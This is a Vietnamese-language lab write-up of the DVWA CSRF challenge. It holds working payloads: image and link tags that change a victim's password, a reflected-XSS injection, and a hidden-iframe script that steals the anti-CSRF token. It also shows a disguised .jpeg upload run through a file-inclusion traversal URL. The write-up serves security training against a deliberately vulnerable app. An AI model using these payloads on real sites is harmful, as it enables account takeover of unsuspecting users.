# Cross-site request forgery (CSRF) (DVWA)

## Đề bài

![image](https://hackmd.io/_uploads/B1WpaHrT6.png)

- chúng ta cần thay đổi mật khẩu của user hiện tại thành mật khẩu mới của mình trong khi user hiện tại không biết về điều đó thông qua CSRF attack
- và với lỗ hổng client side này mình sẽ vừa đóng vai là victim lẫn attacker

## low level

### Phân tích

- xem source code của bài này mình được

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $current_user = dvwaCurrentUser();
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . $current_user . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

- đọc source code trên chúng ta có thể thấy chương trình lấy thông tin do người dùng nhập trên url qua phương thức GET và chỉ kiểm tra mật khẩu và mật khẩu nhập lại có khớp nhau không
- nếu khớp thì đổi mật khẩu và thông báo **Password Changed.**
- nếu không thì chỉ thông báo **Passwords did not match.**

và khi mình tiến hành đổi password thành **pwned** thì đúng như chúng ta đã phân tích các tham số do người dùng nhập được đưa vào url `http://localhost/dvwa/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change#` để chuyển đi và thông báo **Password Changed.** kèm với đó chúng ta thấy cookie được gửi kèm theo request

![image](https://hackmd.io/_uploads/Sk9M3Urp6.png)

khi đăng nhập lại với password **pwned** thành công

![image](https://hackmd.io/_uploads/BkLzYIB6p.png)

![image](https://hackmd.io/_uploads/HkVLYIBp6.png)

và chúng ta để ý ở phần Set-Cookie server trả về không có giá trị SameSite cookie nên mặc định nó sẽ là Lax theo như dvwa đã note cho chúng ta

![image](https://hackmd.io/_uploads/HymaTvrpa.png)

![image](https://hackmd.io/_uploads/BJgUaDBTT.png)

như vậy chúng ta chỉ cần gửi 1 request vơi phương thức GET đã có thể thay đổi được password vậy mình sẽ viết 1 trang html có chứa đường link đến url thay đổi và khi victim vào trang html này mật khẩu kèm theo cookie của victim sẽ được gửi đến trang thay đổi mật khẩu của dvwa

### Khai thác

mình tạo 1 file html với payload được đưa vào thẻ img

```htmlembedded!
 <img src="http://localhost/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#"/>
```

và khi vào trang này browser của victim sẽ request với phương thức GET để gen ra hình ảnh nhưng đường link của ảnh đó chính là payload mà chúng ta muốn victim thực hiện

- ở đây mình đổi lại mật khẩu thành **password**

![image](https://hackmd.io/_uploads/rkEkJPra6.png)

mình sẽ đẩy nó lên githubpage để public nó ra internet

và khi mình đóng vai là victim link vào file html này

![image](https://hackmd.io/_uploads/SJHzlDrTa.png)

có 1 requesst thay đổi mật khẩu

![image](https://hackmd.io/_uploads/rJXvywHpa.png)

![image](https://hackmd.io/_uploads/Sy__QvSTp.png)

và chúng ta có thể thấy cookie của vicitm chưa được gửi kèm với request này và server đã set 1 cookie khác cho chúng ta với chế độ impossible và `SameSite=Strict` ở response và khi mình test thử xem mật khẩu thay đổi chưa thì nó vẫn chưa nhận

![image](https://hackmd.io/_uploads/HJNr-vBT6.png)

và mình thử payload khác

```htmlembedded!
<a href="http://localhost/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#">Click Me</a>
```

![image](https://hackmd.io/_uploads/ByqKYPBTT.png)

lúc này đóng giả victim nhấn vào file html

![image](https://hackmd.io/_uploads/BJjU_wrTa.png)

và khi victim click vào **Click Me** mình thấy được trang web đã chuyển hướng đến đổi mật khẩu kèm theo cookie của victim

![image](https://hackmd.io/_uploads/HJMY_PBa6.png)

kiểm tra lại thấy mật khẩu đã được đổi thành password

![image](https://hackmd.io/_uploads/B1JMtvBap.png)

vậy là chúng ta đã khai thác thành công với mức độ low level

## medium level

### Phân tích

- xem source code của bài này mình được

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Checks to see where the request came from
    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
        // Get input
        $pass_new  = $_GET[ 'password_new' ];
        $pass_conf = $_GET[ 'password_conf' ];

        // Do the passwords match?
        if( $pass_new == $pass_conf ) {
            // They do!
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
            $pass_new = md5( $pass_new );

            // Update the database
            $current_user = dvwaCurrentUser();
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . $current_user . "';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

            // Feedback for the user
            echo "<pre>Password Changed.</pre>";
        }
        else {
            // Issue with passwords matching
            echo "<pre>Passwords did not match.</pre>";
        }
    }
    else {
        // Didn't come from a trusted source
        echo "<pre>That request didn't look correct.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

tương tự bài trước nhưng đoạn code này có thêm phần kiểm tra trường **Referer**: (Đây là một trường tiêu đề HTTP chứa URL của trang mà người dùng đang đến từ. Nó được gửi đi bởi trình duyệt web khi một người dùng nhấp vào một liên kết hoặc thực hiện một yêu cầu HTTP khác từ một trang web khác. Trong nhiều trường hợp, trường tiêu đề này cung cấp cho máy chủ một phần thông tin về nguồn gốc của yêu cầu, giúp họ hiểu được ngữ cảnh của yêu cầu)

mình thử đổi lại password thành **pwned** và thành công

![image](https://hackmd.io/_uploads/Sk5uVYrTp.png)

và mình vào **Test Credential** để test và thành công đổi được mật khẩu

- cùng với đó kiểm tra phần **Set-Cookie** server trả về cho chúng ta thấy không có phần SameSite cookie nên default trên browser là Lax

![image](https://hackmd.io/_uploads/BkfPVKHa6.png)

và mình thử với đoạn webshell như bài trước

![image](https://hackmd.io/_uploads/rkV-UKSa6.png)

![image](https://hackmd.io/_uploads/SJFzLYSpp.png)

và trang web thông báo lỗi **Warning: Undefined array key "HTTP_REFERER" in D:\Xampp_folder\htdocs\DVWA\vulnerabilities\csrf\source\medium.php on line 5**

- cùng với đó là thông báo **That request didn't look correct.**

![image](https://hackmd.io/_uploads/ryZ1wYrap.png)

kiểm tra lại request khi victim click vào trang html của chúng ta mình thấy đã có cookie của victim gửi kèm theo

thông báo **That request didn't look correct.** cho thấy web đã vào trường hợp kiểm tra `$_SERVER[ 'SERVER_NAME' ]) == false` vậy chúng ta cần tạo trang html sao cho có thể bypass được referrer này

mình đã thêm **referrerpolicy="unsafe-url"** vào thẻ `<a>`

điều này yêu cầu trình duyệt gửi thông tin về URL đầy đủ của trang gốc khi người dùng click vào liên kết, ngay cả khi liên kết đó chuyển hướng tới một tài nguyên từ một nguồn gốc khác.

![image](https://hackmd.io/_uploads/rkO7jYBpa.png)

nhưng trang web vẫn thông báo lỗi

![image](https://hackmd.io/_uploads/BJ-76Fr66.png)

và theo như dvwa gợi ý chúng ta có thể lưu trữ trang html tại lỗ hổng store XSS hay reflect XSS và cho victim truy cập đến trang web này trên dvwa và lúc này trường referrer sẽ thỏa mãn cùng nguồn trang

![image](https://hackmd.io/_uploads/Bkp3TYHTp.png)

### Khai thác

mình vào trang web chứa XSS reflect và lưu với name là thẻ

```htmlembedded!
<a href="http://localhost/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#">Click Me</a>
```

và thấy trang web đã nhúng thẻ `<a>` của mình vào và trên đường dẫn URL cũng hiện thẻ `<a>` của mình

![image](https://hackmd.io/_uploads/B1M7zqH66.png)

và khi victim vào được trang web này và click vào thẻ `<a>` mình vừa tạo thì 1 request từ victim sẽ gửi đến trang đổi mật khẩu kèm theo cookie và trường referrer hợp lệ từ trang web chứa XSS của server dvwa

![image](https://hackmd.io/_uploads/SyqmmqrTp.png)

và mình thấy response thay đổi mật khẩu thành công

- mình kiểm tra lại mật khẩu thấy mật khẩu của victim đã được thay đổi thành công thành **password**

![image](https://hackmd.io/_uploads/S1u97crpp.png)

## high level

### Phân tích

- xem source code của bài này mình được

```php
<?php

$change = false;
$request_type = "html";
$return_message = "Request Failed";

if ($_SERVER['REQUEST_METHOD'] == "POST" && array_key_exists ("CONTENT_TYPE", $_SERVER) && $_SERVER['CONTENT_TYPE'] == "application/json") {
    $data = json_decode(file_get_contents('php://input'), true);
    $request_type = "json";
    if (array_key_exists("HTTP_USER_TOKEN", $_SERVER) &&
        array_key_exists("password_new", $data) &&
        array_key_exists("password_conf", $data) &&
        array_key_exists("Change", $data)) {
        $token = $_SERVER['HTTP_USER_TOKEN'];
        $pass_new = $data["password_new"];
        $pass_conf = $data["password_conf"];
        $change = true;
    }
} else {
    if (array_key_exists("user_token", $_REQUEST) &&
        array_key_exists("password_new", $_REQUEST) &&
        array_key_exists("password_conf", $_REQUEST) &&
        array_key_exists("Change", $_REQUEST)) {
        $token = $_REQUEST["user_token"];
        $pass_new = $_REQUEST["password_new"];
        $pass_conf = $_REQUEST["password_conf"];
        $change = true;
    }
}

if ($change) {
    // Check Anti-CSRF token
    checkToken( $token, $_SESSION[ 'session_token' ], 'index.php' );

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = mysqli_real_escape_string ($GLOBALS["___mysqli_ston"], $pass_new);
        $pass_new = md5( $pass_new );

        // Update the database
        $current_user = dvwaCurrentUser();
        $insert = "UPDATE `users` SET password = '" . $pass_new . "' WHERE user = '" . $current_user . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert );

        // Feedback for the user
        $return_message = "Password Changed.";
    }
    else {
        // Issue with passwords matching
        $return_message = "Passwords did not match.";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);

    if ($request_type == "json") {
        generateSessionToken();
        header ("Content-Type: application/json");
        print json_encode (array("Message" =>$return_message));
        exit;
    } else {
        echo "<pre>" . $return_message . "</pre>";
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

tương tự các bài trước trong mục đổi mật khẩu mình không cần nhập mật khẩu cũ mà chỉ cần nhập mật khẩu mới và confirm

- mình đổi mật khẩu sang **pwned** và thành công
- quan sát thấy có giá trị token gửi kèm theo trên URL

![image](https://hackmd.io/_uploads/BJCFI2Hp6.png)

và Ctrl + U mình thấy có giá trị user_token trên form đăng nhập và giá trị này được gửi đến server qua URL

![image](https://hackmd.io/_uploads/B1AMH2BaT.png)

- và mình kiểm tra lại với Test Credentials với mật khẩu là pwned và thành công cùng với đó quan sát thấy trường SameSite cookie ở đây không có và mặc định nó sẽ là Lax

![image](https://hackmd.io/_uploads/SJY_thBTa.png)

và như đoạn code trên hệ thống sẽ kiểm tra token trước khi đổi mật khẩu nếu token đúng thì chúng ta có thể đổi được password luôn mà không check trường Referer như bài Medium nữa

- vậy chúng ta cần tìm cách bypass giá trị token này
- với giá trị origin trong header mình đoán trang web có dùng CORS nên việc viết 1 trang html rồi deploy lên github pages sẽ không thể lấy được dữ liệu token được từ trang localhost dvwa nên tương tự bài Medium mình sẽ cố gắng đẩy đoạn trang html độc hại lên server của dvwa và gửi cho người dùng click vào

### Khai thác

- đầu tiên để lấy được token chúng ta cần thực hiện đoạn script sau

```htmlembedded!
 doc.getElementByName("user_token")[0].value
```

![image](https://hackmd.io/_uploads/HkFZR3HpT.png)

với file html có nội dung như sau mình sẽ store và trang web chứa lỗ hổng XSS

```htmlembedded!
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
  </head>
  <body>
    <h1>Đây là webshell của Cường</h1>
    <iframe
      id="myFrame"
      src="http://localhost/dvwa/vulnerabilities/csrf"
      style="visibility: hidden"
      onload="maliciousPayload()"
    ></iframe>
    <script>
      function maliciousPayload() {
        console.log("start");
        var iframe = document.getElementById("myFrame");
        var doc =
          iframe.contentWindow.contentDocument || iframe.contentWindow.document;
        var token = doc.getElementByName("user_token")[0].value;
        const http = new XMLHttpRequest();
        const url =
          "http://localhost/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change&user_token=" +
          token +
          "#";
        http.open("GET", url);
        http.send();
        console.log("password changed");
      }
    </script>
  </body>
</html>
```

mình chỉnh về level low và tiến hành upload file html lên website store XSS

vì trang web giới hạn ở fronted chỉ được nhập 50 ký tự nên mình sẽ thay đổi thành 5000 và nhập được toàn bộ file html vào phần message

![image](https://hackmd.io/_uploads/B1IgoxITp.png)

và khi gửi cho victim trang URL đến trang web chứa lỗ hổng CSRF này 1 request đổi lại mật khẩu thành **password** sẽ được thực hiện

giờ mình sẽ đóng giả victim và truy cập vào trang web chứa lỗ hổng store XSS này

![image](https://hackmd.io/_uploads/rktf2eUp6.png)

nhưng mật khẩu chưa được thay đổi vì chúng ta đã thực hiện store XSS không thành công mình CTRL + U để xem trang XSS và thấy nội dung file không được hiển thị toàn bộ có lẽ ở mức độ high Store XSS đã chặn điều đó

![image](https://hackmd.io/_uploads/HJUD6lUap.png)

- vậy còn 1 chức năng lưu code trên server nữa là file upload mình chưa thử
- đoạn code của chức năng này như sau

```php

<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?>
```

chúng ta bị filter ở file ảnh và kích thước của file

- chúng ta sẽ tạo file html như sau

![image](https://hackmd.io/_uploads/HyvpSZLpa.png)

và rename nó thành file ảnh với phần mở rộng là `.jpeg`

- sau đó mình upload tập tin và thành công bypass cơ chế filter của file upload

![image](https://hackmd.io/_uploads/r15te-Ipa.png)

- và đường link đọc file cũng được show ra

![image](https://hackmd.io/_uploads/H13dlZIa6.png)

vì chúng ta upload lên là file ảnh nên khi vào đường link đọc file này đoạn code html không được server hiểu và thực thi

- và để thực thi được file này mình sẽ vào chức năng file inclusion

với URL

```!
http://localhost/dvwa/vulnerabilities/fi/?page=file1.php%0A/../../../hackable/uploads/index.jpeg
```

trang web đã được thực thi

![image](https://hackmd.io/_uploads/SJldfWUpp.png)

![image](https://hackmd.io/_uploads/Bkvhv-8Ta.png)

![image](https://hackmd.io/_uploads/BkFzIZLa6.png)

vậy chúng ta chỉ cần gửi cho victim URL sau

```!
http://localhost/dvwa/vulnerabilities/fi/?page=file1.php%0A/../../../hackable/uploads/index.jpeg
```

![image](https://hackmd.io/_uploads/B1Np8-8aT.png)

khi đó requesst đổi mật khẩu kèm theo token của victim sẽ được gửi

![image](https://hackmd.io/_uploads/ryTZv-866.png)

và mình vào Test Credentials kiểm tra mật khẩu đã thực sự được thay đổi

![image](https://hackmd.io/_uploads/rJdED-Lap.png)

## impossible level

### Phân tích

![image](https://hackmd.io/_uploads/SkkiO-La6.png)

đọc source code mình được

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $pass_curr = $_GET[ 'password_current' ];
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Sanitise current password input
    $pass_curr = stripslashes( $pass_curr );
    $pass_curr = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_curr ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass_curr = md5( $pass_curr );

    // Check that the current password is correct
    $data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
    $current_user = dvwaCurrentUser();
    $data->bindParam( ':user', $current_user, PDO::PARAM_STR );
    $data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );
    $data->execute();

    // Do both new passwords match and does the current password match the user?
    if( ( $pass_new == $pass_conf ) && ( $data->rowCount() == 1 ) ) {
        // It does!
        $pass_new = stripslashes( $pass_new );
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update database with new password
        $data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
        $data->bindParam( ':password', $pass_new, PDO::PARAM_STR );
        $current_user = dvwaCurrentUser();
        $data->bindParam( ':user', $current_user, PDO::PARAM_STR );
        $data->execute();

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match or current password incorrect.</pre>";
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

đoạn code có dùng token và nếu muốn thay đổi mật khẩu thì người dùng cần nhập mật khẩu hiện tại và chúng ta không biết nó là gì

<img  src="https://3198551054-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FVvHHLY2mrxd5y4e2vVYL%2Fuploads%2FF8DJirSFlv1Un7WBmtvu%2Fcomplete.gif?alt=media&token=045fd197-4004-49f4-a8ed-ee28e197008f">

## Tham khảo thêm tại bài viết khác của mình

- https://hackmd.io/@monstercuong7/r1lfQdNcp
